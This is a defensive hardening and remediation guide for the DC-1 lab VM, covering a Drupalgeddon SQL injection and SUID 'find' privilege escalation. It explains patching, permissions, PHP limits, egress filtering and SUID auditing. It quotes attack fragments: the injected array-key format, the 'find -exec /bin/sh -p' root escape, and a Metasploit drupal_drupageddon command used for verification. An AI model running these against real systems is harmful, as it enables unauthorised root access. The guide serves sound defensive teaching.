# DC-1 — Hardening & Remediation Guide

The [README.md](README.md) demonstrated a **two-link** attack chain: **Drupalgeddon (CVE-2014-3704)** provided code execution as `www-data`, and the **SUID bit on `/usr/bin/find`** provided `root`. This guide explains how to break **each** link independently, so that the attack fails even if one countermeasure is omitted.

The attack on DC-1 teaches two important lessons:

1. **Delayed patching is itself a vulnerability.** The fix for Drupalgeddon was released in October 2014. What Metasploit did in the lab, automated bots did across the entire Internet **within hours** of the announcement.
2. **File permissions are a security mechanism.** A single bit (`s`) on the wrong executable defeats Linux user separation.

> ⚠️ **Before you begin:** take a **snapshot** of the VM. After hardening, restore the snapshot on a second VM or rerun Metasploit against the same one to observe the difference.

> ℹ️ The commands are executed **on DC-1 as `root`**. To obtain root access without performing the attack, you can reboot and enter single-user mode from GRUB (`init=/bin/bash`), or simply use the root shell you obtained during the lab.

---

## Contents

1. [Map: Attack → Cause → Remediation](#1-map-attack--cause--remediation)
2. [System Inventory](#2-system-inventory)
3. [Understanding Drupalgeddon (in Order to Understand the Fix)](#3-understanding-drupalgeddon)
4. [Upgrading Drupal](#4-upgrading-drupal)
5. [Reducing Information Disclosure (Fingerprinting)](#5-reducing-information-disclosure)
6. [Hardening Drupal Configuration and Files](#6-hardening-drupal-configuration-and-files)
7. [PHP Hardening](#7-php-hardening)
8. [Restricting Outbound Connections (Preventing Reverse Shells)](#8-restricting-outbound-connections)
9. [SUID: Understanding, Auditing, Remediation](#9-suid-understanding-auditing-remediation)
10. [Mount Options: `nosuid`, `noexec`, `nodev`](#10-mount-options)
11. [Operating System, Services, Firewall, SSH](#11-operating-system-services-firewall-ssh)
12. [Verification](#12-verification)
13. [Checklist & Self-Assessment Questions](#13-checklist--self-assessment-questions)

---

## 1. Map: Attack → Cause → Remediation

| Phase (README) | What the attacker exploited | Root cause | Remediation (section) |
| :--- | :--- | :--- | :--- |
| 1. `nmap -sV -p-` | Apache, Debian Wheezy, Drupal 7, port 111 | Outdated OS, unnecessary services, banners | §5, §11 |
| 1. `CHANGELOG.txt` | Exact Drupal version | Documentation files accessible from the web | §5 |
| 2. `drupal_drupageddon` | SQL Injection → unauthenticated RCE | Drupal < 7.32 | §3, §4 |
| 2. Meterpreter (`reverse_tcp`) | The server connected **to** the attacker | No outbound traffic policy | §8 |
| 3. `pty.spawn` | Interactive shell as `www-data` | PHP is able to execute system commands | §7 |
| 3. `settings.php` | Database credentials (`flag1` → `settings.php`) | File is readable; database user has excessive privileges | §6 |
| 4. `find / -perm -u=s` | `/usr/bin/find` with SUID root | Incorrect file permissions | §9, §10 |
| 4. `find . -exec /bin/sh \; -quit` | Root shell | `find` executes arbitrary commands | §9 |

---

## 2. System Inventory

```bash
cat /etc/debian_version          # → 7.x (Wheezy)
uname -a
ss -tulpn 2>/dev/null || netstat -tulpn    # Wheezy may not have ss, so we fall back to netstat
```

We identify the Drupal version **from the inside** (the attacker discovered it from the outside):

```bash
cd /var/www
grep "define('VERSION'" includes/bootstrap.inc
```

Drupal 7 defines its version in the `VERSION` constant within `includes/bootstrap.inc`. If the value is **lower than 7.32**, the system is vulnerable to Drupalgeddon.

We also perform an initial inventory of SUID files, which we will use in §9:

```bash
find / -xdev -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
```

---

## 3. Understanding Drupalgeddon

To apply a fix correctly, we must understand what it fixes.

Drupal 7 includes a **database abstraction layer** that uses **prepared statements**, i.e., queries with placeholders. This is normally the correct defense against SQL Injection. However, when the value of a placeholder is an **array** (e.g., for `IN (...)`), the `expandArguments()` function in `includes/database/database.inc` automatically generates new placeholders using the array's **keys**:

```php
// Vulnerable code (Drupal ≤ 7.31)
foreach ($data as $i => $value) {
    $new_keys[$key . '_' . $i] = $value;
}
```

The application assumed that the keys would be numeric (`0, 1, 2…`). The attacker, however, submits a field to the login form such as `name[0; INSERT INTO users ...;#]`. PHP converts this into an array whose **key is SQL text**, and that text ends up **inside** the query. The result is arbitrary SQL execution **without** the need for an account. From there, Metasploit writes PHP code into the database (e.g., via the cache or the menu router) and executes it.

The **official fix** (Drupal 7.32) was a single line:

```php
// Patched code (Drupal ≥ 7.32)
foreach (array_values($data) as $i => $value) {
    $new_keys[$key . '_' . $i] = $value;
}
```

`array_values()` discards the keys supplied by the user and replaces them with `0, 1, 2…`. **Lesson:** user data is not safe merely because it passes through a prepared statement. **Every** part of the input (the keys as well, not only the values) must be treated as untrusted.

---

## 4. Upgrading Drupal

### 4.1 Emergency Fix (Hotfix) When an Upgrade Is Not Immediately Possible

In real-world systems, a full upgrade may require testing. If the vulnerability is being **actively** exploited, we apply the one-line fix **first**:

```bash
cd /var/www
cp includes/database/database.inc /root/database.inc.bak

# Locate the line
grep -n 'foreach ($data as $i => $value)' includes/database/database.inc

# Apply the fix
sed -i 's/foreach (\$data as \$i => \$value)/foreach (array_values($data) as $i => $value)/' includes/database/database.inc

# Confirm
grep -n 'array_values($data)' includes/database/database.inc
```

> ⚠️ The hotfix is a **temporary** measure. Version 7.31 has many other vulnerabilities (e.g., Drupalgeddon 2, CVE-2018-7600) that this line does not address.

### 4.2 Upgrading to the Latest Drupal 7 Release

```bash
# 1. Backups: files AND database
tar czf /root/drupal-files-$(date +%F).tgz /var/www
mysqldump -u root -p drupaldb > /root/drupal-db-$(date +%F).sql

# 2. Maintenance mode: visitors see a message, not a half-upgraded site
drush -r /var/www vset maintenance_mode 1

# 3. Upgrade core and modules
drush -r /var/www pm-update

# 4. Run any database updates the new version may require
drush -r /var/www updatedb

# 5. Restore normal operation
drush -r /var/www vset maintenance_mode 0
drush -r /var/www cc all
```

* **`drush`** is the Drupal command-line tool (on Wheezy: `apt-get install drush`).
* The database name (`drupaldb`) can be found in `sites/default/settings.php`.
* `-r /var/www`: the root path of the Drupal installation.
* `cc all`: clears all caches. Drupalgeddon frequently leaves malicious code **inside the cache**, so clearing it is also a post-compromise cleanup measure.

If `drush` has no Internet access, the upgrade is performed manually as follows: download the new tarball from drupal.org, replace **all** files **except** the `sites/` directory and `.htaccess` (if you have modified it), and open `/update.php`.

### 4.3 The Real Solution: Migrating Away from Drupal 7

**Drupal 7 reached its end of life in January 2025.** Official security updates are no longer released. The long-term solution is migration to **Drupal 10/11** (using the `migrate_upgrade` tools) or to another supported platform. In the meantime, commercial "Extended Support" services provide updates for a fee.

### 4.4 Checking for Indicators of Prior Compromise

If the site was exposed while running a vulnerable version, **we assume it has already been compromised**. The upgrade closes the entry point, but it does not remove anyone who has already gained access.

```bash
# Administrator users we do not recognize
drush -r /var/www sqlq "SELECT u.uid, u.name, u.mail, FROM_UNIXTIME(u.created) FROM users u JOIN users_roles r ON u.uid=r.uid;"

# Recently modified PHP files
find /var/www -name '*.php' -mtime -30 -ls

# Suspicious PHP files in directories that should not contain any
find /var/www/sites/default/files -name '*.php'

# Suspicious functions in PHP files
grep -rlE 'eval\(base64_decode|assert\(\$_|system\(\$_' /var/www
```

If anything is found, the safest course of action is to **reinstall from a clean source** and restore only the data.

---

## 5. Reducing Information Disclosure

The attacker read `/CHANGELOG.txt` and determined the exact version. Drupal 7 has several such files in its root directory.

```bash
cd /var/www
ls *.txt
# CHANGELOG.txt COPYRIGHT.txt INSTALL.mysql.txt INSTALL.pgsql.txt INSTALL.sqlite.txt
# INSTALL.txt LICENSE.txt MAINTAINERS.txt README.txt UPGRADE.txt
```

**Option A — deletion** (simple, but the files reappear with every upgrade):

```bash
rm -f CHANGELOG.txt INSTALL*.txt MAINTAINERS.txt UPGRADE.txt README.txt
```

**Option B — denial by Apache** (permanent):

```apache
# /etc/apache2/conf.d/drupal-hardening   (Apache 2.2 on Wheezy)
<Directory /var/www>
    <FilesMatch "^(CHANGELOG|COPYRIGHT|INSTALL.*|LICENSE|MAINTAINERS|README|UPGRADE)\.txt$">
        Order allow,deny
        Deny from all
    </FilesMatch>
    <FilesMatch "^(install|update|cron|authorize|xmlrpc)\.php$">
        Order allow,deny
        Deny from all
        Allow from 127.0.0.1 192.168.56.0/24
    </FilesMatch>
    Options -Indexes
</Directory>
```

* Wheezy ships **Apache 2.2**, which uses `Order/Deny/Allow`. In Apache 2.4 the equivalent is written as `Require all denied` / `Require ip ...`.
* `install.php`, `update.php`, and `cron.php` are needed only by the administrator, so they are permitted only from the management network.

Hiding the Apache and PHP banners:

```apache
# /etc/apache2/conf.d/security
ServerTokens Prod
ServerSignature Off
TraceEnable Off
```

```bash
sed -i 's/^expose_php = On/expose_php = Off/' /etc/php5/apache2/php.ini
apache2ctl configtest && service apache2 reload
```

In addition, Drupal 7 sends the `X-Generator: Drupal 7` header and the `<meta name="Generator">` tag. These can be removed with the `remove_generator` module or with `Header unset X-Generator` (requires `a2enmod headers`).

---

## 6. Hardening Drupal Configuration and Files

### 6.1 The `settings.php` File

`flag1.txt` pointed to `sites/default/settings.php`, which contains the database credentials. `www-data` must be able to **read** it, but **no one** should be able to write to it through the web server.

```bash
cd /var/www/sites/default
ls -l settings.php

chown root:www-data settings.php
chmod 440 settings.php           # r--r----- : read by root and www-data, no write access
chmod 555 .                       # The sites/default directory does not accept new files
```

Why `440` rather than `640`? Because Drupal checks on the *Status report* page whether `settings.php` is **writable** and issues a warning. Not even root requires write access during normal operation; when a change is needed, root temporarily runs `chmod 640`.

### 6.2 Least-Privilege Database User

```sql
-- Which privileges does the Drupal user currently have?
SHOW GRANTS FOR 'dbuser'@'localhost';
```

If you see `ALL PRIVILEGES ON *.*` or `FILE`, the user has far more privileges than it needs:

```sql
REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'dbuser'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER
      CREATE TEMPORARY TABLES, LOCK TABLES
  ON drupaldb.* TO 'dbuser'@'localhost';
SET PASSWORD FOR 'dbuser'@'localhost' = PASSWORD('New-Strong-Password-2026!');
FLUSH PRIVILEGES;
```

This is the official list of privileges required by Drupal 7 (`INSTALL.mysql.txt`). Update `settings.php` with the new password. The **old** password must be considered compromised, because the attacker has read it.

### 6.3 File Ownership: The Web Server Reads, It Does Not Write

```bash
cd /var/www
chown -R root:www-data .
find . -type d -exec chmod 750 {} \;
find . -type f -exec chmod 640 {} \;

# Exception: the uploaded files directory requires write access
chown -R www-data:www-data sites/default/files
find sites/default/files -type d -exec chmod 770 {} \;
find sites/default/files -type f -exec chmod 660 {} \;
```

**Why this matters:** if an exploit obtains code execution as `www-data`, the first thing it attempts is to write a **persistent backdoor** (e.g., `shell.php`) into some directory of the site. With these permissions, `www-data` can write **only** to `files/`, and there…

### 6.4 …We Prohibit PHP Execution in `files/`

Drupal 7 automatically creates `sites/default/files/.htaccess`. We confirm that it exists and contains:

```apache
SetHandler Drupal_Security_Do_Not_Remove_See_SA_2006_006
Options None
Options +FollowSymLinks
<IfModule mod_php5.c>
  php_flag engine off
</IfModule>
```

* `php_flag engine off`: even if a `.php` file is uploaded, Apache will not execute it.
* `.htaccess` takes effect only if Apache has `AllowOverride All` for the directory. Verify this in `/etc/apache2/sites-enabled/000-default`.

### 6.5 Disabling Dangerous Modules

The **PHP filter** module allows anyone holding the corresponding permission to write PHP code within content. If an attacker obtains an administrator account (e.g., via the SQLi), they can use it to execute code.

```bash
drush -r /var/www pm-list --status=enabled --type=module | grep -i php
drush -r /var/www pm-disable php -y
```

General rule: **any module that is not in use should be disabled and removed.**

### 6.6 Changing Drupal User Passwords

The Drupalgeddon SQLi allows both reading **and** modifying the `users` table. After the upgrade, we change all administrator passwords:

```bash
drush -r /var/www user-password admin --password="New-Strong-Password"
```

---

## 7. PHP Hardening

After Drupalgeddon, the attacker had **PHP code** execution. To turn this into a **shell** (`shell`, `python -c 'import pty...'`), PHP had to be able to invoke operating system commands. This can be restricted.

In `/etc/php5/apache2/php.ini`:

```ini
; Functions that execute system commands. Drupal core does not need them.
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,show_source

; PHP reads/writes files ONLY within these paths
open_basedir = /var/www:/tmp

; Prohibit loading code from URLs (prevents Remote File Inclusion)
allow_url_include = Off
allow_url_fopen   = Off

expose_php      = Off
display_errors  = Off     ; Errors reveal paths and database structure
log_errors      = On

; Session cookies
session.cookie_httponly = 1
session.use_only_cookies = 1
```

Explanation:

| Setting | What it prevents in the DC-1 scenario |
| :--- | :--- |
| `disable_functions` | Meterpreter's `shell` and every `system("...")` call fail |
| `open_basedir` | PHP cannot read `/etc/passwd`, `/home/*`, `/root` |
| `allow_url_fopen = Off` | PHP cannot download tools (e.g., LinEnum) from the attacker |
| `display_errors = Off` | SQL errors are not displayed in the browser |

```bash
service apache2 restart
php -i | grep -E 'disable_functions|open_basedir'   # Note: the CLI uses a separate php.ini
```

> ⚠️ **Test the site afterwards.** Some contrib modules (e.g., for images or PDFs) may require some of these functions. `allow_url_fopen = Off` may affect Drupal's update check (the *Update manager* module). Remove from the list **only** what is demonstrably required.

> 💡 `disable_functions` is **not** impenetrable, since bypass techniques have been published. It is an **additional** obstacle that forces the attacker to resort to more complex techniques, not a substitute for upgrading.

---

## 8. Restricting Outbound Connections

### 8.1 Why It Is Effective

Metasploit used a **`reverse_tcp`** payload: the **server** opened a connection **to** the attacker. Most firewalls inspect only **inbound** traffic, so the connection went through.

A web server, however, has **no reason** to initiate new connections to arbitrary hosts. It responds to connections directed at it. This is called **egress filtering**.

### 8.2 Per-User iptables Rules

The iptables `owner` module allows rules based on the **user** that generated the packet:

```bash
# www-data may talk to the database locally (loopback)
iptables -A OUTPUT -o lo -j ACCEPT

# Replies on already established connections (e.g., responses to visitors) are allowed
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# www-data needs DNS only if the site communicates with external services
# iptables -A OUTPUT -m owner --uid-owner www-data -p udp --dport 53 -j ACCEPT

# Every NEW connection initiated by www-data is rejected and logged
iptables -A OUTPUT -m owner --uid-owner www-data -m state --state NEW -j LOG --log-prefix "WWW-EGRESS: "
iptables -A OUTPUT -m owner --uid-owner www-data -m state --state NEW -j REJECT
```

* `-A OUTPUT`: appends a rule to the **outbound** packet chain.
* `--uid-owner www-data`: applies only to packets created by `www-data` processes (Apache/PHP).
* `--state NEW`: applies only to **new** connections. Responses to visitors are `ESTABLISHED` and pass through the previous rule.
* `LOG`: writes to `/var/log/kern.log`. Every such entry is a **strong indicator** of compromise.

Saving the rules so that they persist across reboots:

```bash
apt-get install iptables-persistent
iptables-save > /etc/iptables/rules.v4
```

**Result:** even if Drupalgeddon executes successfully, `reverse_tcp` cannot connect back. The attacker would have to use more complex techniques (e.g., a web shell over HTTP), which the measures in §6.3 and §7 make considerably harder.

---

## 9. SUID: Understanding, Auditing, Remediation

### 9.1 What SUID Is

Normally, a program runs with the privileges of the **user who executes it**. With the **SUID bit** (Set User ID), it runs with the privileges of the **file's owner**.

```bash
ls -l /usr/bin/passwd
# -rwsr-xr-x 1 root root ... /usr/bin/passwd
#     ↑ the 's' in place of the owner's 'x' = SUID
```

`passwd` **requires** SUID: an ordinary user must be able to change their own password, which is stored in `/etc/shadow` (readable/writable only by root). `passwd` is designed to do **only** that.

**`find`**, however, has the `-exec` option, which executes **any** command. With SUID root, "any command" means "any command as root":

```bash
find . -exec /bin/sh -p \; -quit
```

This technique applies to any program that can execute other programs, read/write arbitrary files, or spawn a shell (see GTFOBins).

### 9.2 Auditing: Inventory of All SUID/SGID Files

```bash
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -ld {} \; 2>/dev/null
```

* `-perm -4000`: SUID. `-perm -2000`: **SGID** (the equivalent for the group).
* `-xdev`: does not descend into other filesystems (e.g., `/proc`, network mounts).
* `-o`: logical "or".

Compare each result against the list of **expected** SUID binaries on Debian:

| Expected SUID | Why it is needed |
| :--- | :--- |
| `/usr/bin/passwd`, `chsh`, `chfn`, `gpasswd`, `newgrp` | Modifying account details in `/etc/shadow` / `/etc/passwd` |
| `/bin/su`, `/usr/bin/sudo` | Switching users |
| `/bin/mount`, `/bin/umount` | Mounting by users (in configured cases) |
| `/bin/ping` | Raw sockets (replaced by capabilities on newer systems) |
| `/usr/lib/openssh/ssh-keysign`, `/usr/lib/eject/dmcrypt-get-device` | Specialized helper functions |

The following must **never** have SUID: `find`, `vim`, `nano`, `less`, `more`, `cp`, `mv`, `bash`, `python`, `perl`, `nmap`, `tar`, `awk`, `env`.

We confirm whether the SUID bit on `find` comes **from the package** or was added manually:

```bash
dpkg -S /usr/bin/find               # → findutils
dpkg-statoverride --list            # Explicit permission overrides
debsums -c findutils 2>/dev/null    # Modified package files (apt-get install debsums)
```

### 9.3 Remediation

```bash
chmod u-s /usr/bin/find
ls -l /usr/bin/find        # → -rwxr-xr-x  (the 's' became 'x')
```

There is, however, a subtlety: **on the next upgrade of the `findutils` package**, `dpkg` will rewrite the file with the package's permissions. If someone has tampered with the package, or if the permissions are defined by an erroneous override, the SUID bit may return. To **lock in** the correct permissions:

```bash
# If an erroneous override exists, remove it
dpkg-statoverride --remove /usr/bin/find 2>/dev/null

# Define explicitly: owner root, group root, mode 0755, no SUID
dpkg-statoverride --update --add root root 0755 /usr/bin/find
```

`dpkg-statoverride` stores the desired permissions, and `dpkg` applies them on **every** future installation/upgrade of the file.

### 9.4 An Alternative to SUID: Capabilities

The Linux kernel divides root privileges into approximately 40 **capabilities**. If a program needs only **one** privilege, we grant it only that privilege instead of full root via SUID:

```bash
# Example: ping needs only raw sockets
chmod u-s /bin/ping
setcap cap_net_raw+ep /bin/ping
getcap /bin/ping            # → /bin/ping = cap_net_raw+ep
```

If an attacker abuses `ping`, they gain only the ability to send raw packets, not a root shell.

### 9.5 Periodic Auditing Against a Baseline

Once the list has been cleaned up, we save it as a **baseline** and check daily whether anything has changed:

```bash
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | sort > /root/suid-baseline.txt
chmod 600 /root/suid-baseline.txt
```

Audit script `/usr/local/sbin/suid-check.sh`:

```bash
#!/bin/sh
# Compares the current SUID/SGID files against the baseline
CURRENT=$(mktemp)
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | sort > "$CURRENT"
if ! diff -u /root/suid-baseline.txt "$CURRENT" > /root/suid-diff.txt; then
    logger -p auth.warning "SUID/SGID change: $(grep '^+/' /root/suid-diff.txt | tr '\n' ' ')"
fi
rm -f "$CURRENT"
```

```bash
chmod 700 /usr/local/sbin/suid-check.sh
echo '30 3 * * * root /usr/local/sbin/suid-check.sh' > /etc/cron.d/suid-check
```

* `diff -u`: shows the differences. Lines beginning with `+` are **new** SUID files.
* `logger`: writes a message to syslog (`/var/log/auth.log`) so that the administrator can see it.
* The cron job runs every day at 03:30.

In the Raven 2 scenario, where the attacker **added** SUID to `find` via MySQL, this audit would have detected it the following day.

---

## 10. Mount Options

Directories where **any user** can write (`/tmp`, `/var/tmp`, `/dev/shm`) are the first place an attacker stores tools. We can mount them with restrictive options:

| Option | What it does |
| :--- | :--- |
| `nosuid` | The kernel **ignores** the SUID/SGID bit on files in this filesystem |
| `noexec` | Prohibits direct execution of programs from this filesystem |
| `nodev` | Ignores device files (prevents the creation of fake `/dev/sda` devices) |

In `/etc/fstab`:

```text
tmpfs  /tmp      tmpfs  defaults,nosuid,nodev,noexec,size=512M  0 0
tmpfs  /dev/shm  tmpfs  defaults,nosuid,nodev,noexec            0 0
/tmp   /var/tmp  none   bind                                     0 0
```

If `/home` is a separate partition, add `nosuid,nodev` there as well.

```bash
mount -o remount /tmp
mount -o remount /dev/shm
mount | grep -E ' /tmp | /dev/shm '      # Confirm the options
```

* `/var/tmp` becomes a **bind mount** of `/tmp`, so that it inherits the same options.

> ⚠️ `noexec` on `/tmp` may affect `apt` (some package scripts are executed from `/tmp`). If this happens, set the following in `/etc/apt/apt.conf.d/50tmp`: `APT::ExtractTemplates::TempDir "/var/cache/apt/tmp";`, or temporarily run `mount -o remount,exec /tmp` during the upgrade.

> 💡 `noexec` does **not** prevent `sh /tmp/script.sh` or `python /tmp/x.py`, because in those cases the interpreter is executed, not the file. It does, however, block compiled executables, such as most kernel exploits.

---

## 11. Operating System, Services, Firewall, SSH

### 11.1 Updating Debian Wheezy

Wheezy (Debian 7) has been out of support since 2018. For the lab:

```bash
cp /etc/apt/sources.list /etc/apt/sources.list.bak
cat > /etc/apt/sources.list <<'EOF'
deb http://archive.debian.org/debian wheezy main
deb http://archive.debian.org/debian-security wheezy/updates main
EOF
apt-get -o Acquire::Check-Valid-Until=false update
apt-get upgrade
```

In production, the only meaningful solution is a **fresh installation** of a supported Debian release (12 or 13) and migration of the application. Wheezy's old kernel has known local privilege escalation vulnerabilities (e.g., **Dirty COW, CVE-2016-5195**) that grant root **even without** the SUID `find`.

### 11.2 Disabling Unnecessary Services

`nmap -p-` revealed `rpcbind` (111) and a high RPC port (`rpc.statd`). Wheezy uses **SysVinit**:

```bash
service rpcbind stop
service nfs-common stop
update-rc.d rpcbind disable
update-rc.d nfs-common disable
# or, if they are not needed at all:
apt-get purge rpcbind nfs-common
```

### 11.3 Firewall

```bash
apt-get install ufw
ufw default deny incoming
ufw default allow outgoing     # The www-data egress restriction (§8) applies on top of this
ufw allow 80/tcp
ufw allow from 192.168.56.0/24 to any port 22 proto tcp
ufw enable
```

> ⚠️ `ufw` and the manual `iptables` rules from §8 may conflict. On systems using `ufw`, the additional outbound rules belong in `/etc/ufw/before.rules`, in the `ufw-before-output` chain.

### 11.4 SSH and Accounts

DC-1 has a system user (`flag4`) with a weak password, which other write-ups crack with `hydra` over SSH. We apply the same measures as in [Raven 1 §7](../03.%20Raven-CTF/Hardening-Guide.md#7-hardening-ssh--password-policy):

```text
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3
AllowUsers <administrator>
```

```bash
# Accounts that do not need to log in
usermod -s /usr/sbin/nologin flag4
passwd -l flag4
service ssh reload
```

---

## 12. Verification

From **Kali**:

```bash
# 1. The Drupal version is not disclosed
curl -I http://<DC1_IP>/CHANGELOG.txt                 # → 403
curl -sI http://<DC1_IP>/ | grep -iE 'server|x-generator|x-powered'

# 2. Only the necessary ports
nmap -sV -p- <DC1_IP>

# 3. The exploit fails
msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set RHOSTS <DC1_IP>; set LHOST <KALI_IP>; run; exit"
```

Expected result: `Exploit completed, but no session was created.`

On **DC-1**:

```bash
# 4. find does not have SUID
ls -l /usr/bin/find
dpkg-statoverride --list /usr/bin/find

# 5. Escalation test as www-data: must not yield root
su -s /bin/sh www-data -c 'find . -exec /bin/sh -p -c id \; -quit'
# → uid=33(www-data) ... WITHOUT euid=0

# 6. SUID is ignored in /tmp
cp /bin/sh /tmp/testsh && chmod u+s /tmp/testsh
su -s /bin/sh www-data -c '/tmp/testsh -p -c id'   # → Permission denied (noexec)
rm -f /tmp/testsh

# 7. www-data cannot open outbound connections
su -s /bin/sh www-data -c 'wget -T 3 http://<KALI_IP>:4444/' ; tail -n 3 /var/log/kern.log

# 8. PHP does not execute commands
echo '<?php echo system("id"); ?>' > /var/www/t.php
curl http://localhost/t.php        # → Warning: system() has been disabled for security reasons
rm /var/www/t.php
```

---

## 13. Checklist & Self-Assessment Questions

### 13.1 Checklist

- [ ] Snapshot and backups (files + database)
- [ ] Drupal ≥ 7.32 (ideally the latest 7.x) and a migration plan to Drupal 10/11
- [ ] Check for traces of prior compromise, `drush cc all`
- [ ] `CHANGELOG.txt` and `install.php` inaccessible, banners hidden
- [ ] `settings.php` set to `440 root:www-data`, new database password, least-privilege database user
- [ ] Web root owned by root, only `files/` writable, no PHP execution in `files/`
- [ ] PHP filter module disabled, Drupal administrator passwords changed
- [ ] `php.ini`: `disable_functions`, `open_basedir`, `allow_url_*` Off, `display_errors` Off
- [ ] Egress filtering for `www-data`
- [ ] SUID removed from `find` and locked in with `dpkg-statoverride`
- [ ] SUID baseline and daily audit via cron
- [ ] `/tmp`, `/var/tmp`, `/dev/shm` mounted with `nosuid,nodev,noexec`
- [ ] `rpcbind`/`nfs-common` disabled, firewall `default deny`, SSH hardened
- [ ] Verification of all steps in §12

### 13.2 Self-Assessment Questions

1. Drupal 7 used prepared statements. Why was it nevertheless vulnerable to SQL Injection? What exactly did `array_values()` change?
2. Why is the hotfix in §4.1 considered a **temporary** measure?
3. What is the difference between a `bind_tcp` payload and a `reverse_tcp` payload? Which of the two is prevented by the egress filtering in §8, and which by `ufw default deny incoming`?
4. `passwd` has SUID root and we consider it safe. `find` with SUID root is not. What is the essential difference?
5. What problem does `dpkg-statoverride` solve that a simple `chmod u-s` does not?
6. An attacker copies a SUID executable to `/tmp`. Which `/etc/fstab` option neutralizes its SUID bit? Which option prevents its execution entirely?
7. Why do we change the database password **after** the upgrade, given that the vulnerability has already been fixed?

### Suggested Answers

1. Prepared statements protected the **values**, but Drupal dynamically built the placeholders from the **keys** of an array controlled by the user (at login), so the placeholder names became part of the SQL string. The `array_values()` fix **discarded the user-controlled keys** and renumbered the array, so that the user can no longer influence the **structure** of the query — only the values (which are sanitized).
2. The hotfix is a targeted patch (or WAF rule) that stops the known exploit, but it **does not upgrade** the code to the patched release. Other known and unknown vulnerabilities of the old version remain, the hotfix may be lost during future changes, and it is not covered by official maintenance. It is a bridge until a proper upgrade is performed.
3. `bind_tcp` opens a port **on the target**, and the attacker connects inward (incoming). `reverse_tcp` causes the target to connect **outward** (outgoing). `ufw default deny incoming` blocks **bind_tcp**; **egress filtering** (§8) blocks **reverse_tcp**. In other words, reverse_tcp "defeats" deny-incoming, and egress filtering "defeats" reverse_tcp.
4. Both run as root via SUID, but `passwd` performs **a single, narrowly defined** task (changing a password) and offers no means of executing arbitrary commands — it drops privileges correctly. `find` is **general-purpose** and, via `-exec`, executes any command as root, thereby providing a shell escape. The problem is not SUID per se, but whether the executable permits arbitrary code execution.
5. A simple `chmod u-s` removes the SUID bit **now**, but a future **package update** (`apt upgrade`) reinstalls the file with its original permissions and the SUID bit returns. `dpkg-statoverride` **permanently** records the desired owner/mode in the dpkg database, so that the change persists **even after** upgrades.
6. The **`nosuid`** option causes the kernel to **ignore the SUID/SGID bit** — the executable runs with the user's normal privileges, not as root. The **`noexec`** option **entirely prevents the execution** of any binary from `/tmp`. Ideally, we apply `nosuid,nodev,noexec` to `/tmp` (as well as `/var/tmp` and `/dev/shm`).
7. Because the password may already have been **leaked or stolen** before the upgrade (the attacker read `settings.php` and its credentials during the compromise). The upgrade closes the hole but **does not invalidate** credentials that have already leaked; we change them **afterwards** so that they cannot be reused — and only once we have first confirmed that the system is now clean.

---

## Sources

- [Drupal Security Advisory SA-CORE-2014-005 (Drupalgeddon)](https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql)
- [NVD — CVE-2014-3704](https://nvd.nist.gov/vuln/detail/CVE-2014-3704)
- [Drupal — Securing file permissions and ownership](https://www.drupal.org/docs/administering-a-drupal-site/security-in-drupal/securing-file-permissions-and-ownership)
- [Drupal 7 End of Life](https://www.drupal.org/about/drupal-7/d7eol)
- [Debian — dpkg-statoverride(1)](https://manpages.debian.org/dpkg-statoverride)
- [Linux — capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
- [PHP — Runtime configuration: disable_functions, open_basedir](https://www.php.net/manual/en/ini.core.php)
